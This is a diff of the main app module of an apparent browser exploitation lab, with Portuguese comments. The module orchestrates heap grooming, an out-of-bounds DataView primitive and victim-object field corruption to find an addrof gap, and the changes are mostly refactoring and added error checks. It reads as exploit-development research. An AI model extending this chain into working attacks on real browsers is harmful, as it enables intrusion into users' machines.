@@ -1,6 +1,6 @@
 // js/app.mjs
-import { log, PAUSE_LAB } from './utils.mjs';
-import * as Int64Lib from './int64.mjs'; // Renomeado para Int64Lib para consistência
+import { log, PAUSE_LAB } from './utils.mjs'; // log é exportado e usado globalmente
+import * as Int64Lib from './int64.mjs';
 import * as Core from './core_exploit.mjs';
 import * as Groomer from './heap_groomer.mjs';
 import * as Corruptor from './victim_corruptor.mjs';
@@ -24,21 +24,30 @@ const App = {
             { victim_first: true, oob_first: false, spray_adj: 200, inter_adj: 50, name: "Vítima primeiro, Spray Maior"},
             { victim_first: false, oob_first: true, spray_adj: -100, inter_adj: -20, name: "OOB primeiro, Spray Menor"},
         ];
-        Corruptor.resetLastSuccessfulGap(); // <<< USA FUNÇÃO PARA RESETAR
+        Corruptor.resetLastSuccessfulGap(); // USA FUNÇÃO PARA RESETAR
 
         for (const strat of strategies) {
-            if (Corruptor.getLastSuccessfulGap() !== null) { log("GAP de sucesso já encontrado. Interrompendo.", "good", FNAME_STRAT); break; } // <<< USA GETTER
+            if (Corruptor.getLastSuccessfulGap() !== null) { log("GAP de sucesso já encontrado. Interrompendo.", "good", FNAME_STRAT); break; }
             log(`*** Iniciando Estratégia: ${strat.name} ***`, "critical", FNAME_STRAT);
+
+            let victimPrepared = false;
             if (strat.oob_first) {
                 await Core.triggerOOB_primitive();
-                if (!Core.oob_dataview_real) { log("Falha OOB, pulando.", "error", FNAME_STRAT); continue; }
+                if (!Core.oob_dataview_real) { log("Falha OOB, pulando estratégia.", "error", FNAME_STRAT); continue; }
                 await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, Core.getOOBAllocationSize(), intermediate_allocs + strat.inter_adj, false);
-                if (!await Groomer.prepareVictim(Core.getOOBAllocationSize())) continue;
+                victimPrepared = await Groomer.prepareVictim(Core.getOOBAllocationSize());
+                if (!victimPrepared) { log("Falha ao preparar vítima após OOB primeiro, pulando.", "error", FNAME_STRAT); continue; }
             } else {
                 await Groomer.groomHeapForSameSize(spray_count + strat.spray_adj, Core.getOOBAllocationSize(), intermediate_allocs + strat.inter_adj, true);
-                if (!await Groomer.prepareVictim(Core.getOOBAllocationSize())) continue;
+                victimPrepared = await Groomer.prepareVictim(Core.getOOBAllocationSize());
+                if (!victimPrepared) { log("Falha ao preparar vítima antes de OOB, pulando.", "error", FNAME_STRAT); continue; }
                 await Core.triggerOOB_primitive();
-                if (!Core.oob_dataview_real) { log("Falha OOB, pulando.", "error", FNAME_STRAT); continue; }
+                if (!Core.oob_dataview_real) { log("Falha OOB após vítima, pulando estratégia.", "error", FNAME_STRAT); continue; }
+            }
+            // Certificar que a vítima foi realmente preparada antes de tentar corromper
+            if (!Groomer.victim_object) {
+                log("ERRO CRÍTICO: Groomer.victim_object é null antes de chamar findAndCorruptVictimFields_Iterative. Pulando estratégia.", "error", FNAME_STRAT);
+                continue;
             }
             await Corruptor.findAndCorruptVictimFields_Iterative();
             await PAUSE_LAB(2000);
@@ -47,7 +56,7 @@ const App = {
         if (Corruptor.getLastSuccessfulGap() === null) { log("Nenhuma estratégia resultou em GAP de sucesso.", "error", FNAME_STRAT); }
          else {
             const addrofGapEl = document.getElementById('addrofGap');
-            if (addrofGapEl) addrofGapEl.value = Corruptor.getLastSuccessfulGap(); // <<< USA GETTER
+            if (addrofGapEl) addrofGapEl.value = Corruptor.getLastSuccessfulGap();
          }
     },
 
@@ -56,25 +65,23 @@ const App = {
         const gapVal = gapStartScanEl ? parseInt(gapStartScanEl.value) : NaN;
 
         if (!isNaN(gapVal)) {
-            Corruptor.setCurrentTestGap(gapVal); // <<< USA SETTER
-            log(`CURRENT_TEST_GAP (teste único) atualizado para: ${Corruptor.getCurrentTestGap()} bytes.`, 'tool', 'App.Config'); // <<< USA GETTER
-            Corruptor.try_corrupt_fields_for_gap(Corruptor.getCurrentTestGap()); // <<< USA GETTER
+            Corruptor.setCurrentTestGap(gapVal);
+            log(`CURRENT_TEST_GAP (teste único) atualizado para: ${Corruptor.getCurrentTestGap()} bytes.`, 'tool', 'App.Config');
+            Corruptor.try_corrupt_fields_for_gap(Corruptor.getCurrentTestGap());
         } else { log("Valor de GAP inválido.", "error", "App.Config"); }
     },
 
     setupUIEventListeners: () => {
         const moduleTestButtonsContainer = document.getElementById('moduleTestButtons');
         if (moduleTestButtonsContainer) {
-            moduleTestButtonsContainer.innerHTML = ''; // Limpa botões antigos se houver
+            moduleTestButtonsContainer.innerHTML = '';
             const btnTestInt64 = document.createElement('button');
             btnTestInt64.textContent = 'Testar Módulo Int64';
-            btnTestInt64.onclick = Int64Lib.testModule; // <<< USA Int64Lib
+            btnTestInt64.onclick = () => Int64Lib.testModule(log); // <<< Passa a função 'log' global
             moduleTestButtonsContainer.appendChild(btnTestInt64);
 
             const btnTestUtils = document.createElement('button');
             btnTestUtils.textContent = 'Testar Módulo Utils';
-            // Para utils.testModule, que usa 'log' que é definido após a importação inicial de utils.mjs,
-            // podemos importar dinamicamente aqui para garantir que 'log' está definido ou refatorar utils.mjs para não depender do log global para seu testModule
             btnTestUtils.onclick = () => import('./utils.mjs').then(utils => utils.testModule());
             moduleTestButtonsContainer.appendChild(btnTestUtils);
 
@@ -85,7 +92,7 @@ const App = {
 
             const notes = document.createElement('p');
             notes.className = 'notes';
-            notes.textContent = 'Módulos HeapGroomer e VictimCorruptor são testados através dos fluxos principais (Passos 1-2). PostExploit é conceitual.';
+            notes.textContent = 'Módulos HeapGroomer e VictimCorruptor são testados através dos fluxos principais. PostExploit é conceitual.';
             moduleTestButtonsContainer.appendChild(notes);
         }
 
@@ -106,11 +113,11 @@ const App = {
     initialize: () => {
         updateGlobalOOBConfig();
         App.setupUIEventListeners();
-        log("Laboratório Modularizado (v2.8.0) pronto para testes.", "good", "App.Init");
+        log("Laboratório Modularizado (v2.8.1 - Correções Finais) pronto para testes.", "good", "App.Init");
 
         const addrofGapEl = document.getElementById('addrofGap');
-        if (addrofGapEl && Corruptor.getLastSuccessfulGap() !== null) { // <<< USA GETTER
-             addrofGapEl.value = Corruptor.getLastSuccessfulGap(); // <<< USA GETTER
+        if (addrofGapEl && Corruptor.getLastSuccessfulGap() !== null) {
+             addrofGapEl.value = Corruptor.getLastSuccessfulGap();
         }
     }
 };
